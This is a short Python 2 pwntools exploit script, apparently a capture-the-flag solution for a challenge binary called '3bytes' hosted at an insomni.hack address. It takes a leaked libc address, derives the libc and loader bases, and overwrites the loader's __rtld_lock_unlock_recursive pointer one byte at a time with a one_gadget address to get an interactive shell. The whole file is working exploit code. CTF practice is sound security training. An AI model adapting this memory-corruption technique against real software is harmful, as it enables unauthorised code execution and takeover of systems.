#!/usr/bin/env python2

from pwn import *

LIBC = ELF("libc6.so")
BIN = ELF("3bytes")
ONE_GADGET = 0x4f322
LOCAL = True

if LOCAL:
    r = process("./3bytes", env={"LD_PRELOAD": "./libc6.so"})
    LD_OFFSET = 0x400000
else:
    r = remote("3bytes.insomni.hack", 1337)
    LD_OFFSET = 0x3f1000

libc = int(r.recvline().strip().replace("Good luck, ", "").replace(";)", ""), base=16) - LIBC.symbols["sleep"]
one_gadget = libc + ONE_GADGET
ld = libc + LD_OFFSET
__rtld_lock_unlock_recursive = ld + 0x228F68
log.info("libc = " + hex(libc))
log.info("one_gadget = " + hex(one_gadget))
log.info("ld = " + hex(ld))
log.info("__rtld_lock_unlock_recursive = " + hex(__rtld_lock_unlock_recursive))

p = ""

for i in range(0, 3):
    p += p64(__rtld_lock_unlock_recursive + i) + p64(one_gadget)[i]

r.send(p)
r.interactive()
